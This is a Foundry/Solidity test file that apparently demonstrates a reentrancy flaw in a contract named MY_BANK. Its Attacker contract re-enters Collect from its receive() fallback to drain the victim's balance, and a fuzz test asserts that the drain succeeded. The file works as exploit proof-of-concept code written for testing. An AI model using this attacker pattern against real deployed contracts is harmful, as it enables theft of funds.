
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK} from "../src/MY_BANK.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Log public _log;
    
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);
        
        vm.warp(100);
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        vm.warp(200);
        
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    MY_BANK public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        require(val == storedAttackVal, "Value mismatch");
        
        initialSnapshot = address(victim).balance;
        
        victim.Collect(val);
        
        if (attackCallCount == 2 && address(victim).balance == 0) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }
}
